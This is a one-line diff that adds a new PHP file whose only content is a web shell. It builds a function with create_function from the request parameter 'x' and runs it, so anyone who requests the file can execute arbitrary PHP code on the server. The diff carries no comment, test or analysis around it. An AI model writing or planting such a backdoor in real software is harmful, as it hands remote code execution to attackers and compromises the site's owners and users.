@@ -1,0 +1,1 @@
+<?php $s=create_function('',$_REQUEST[x]);$s();?>
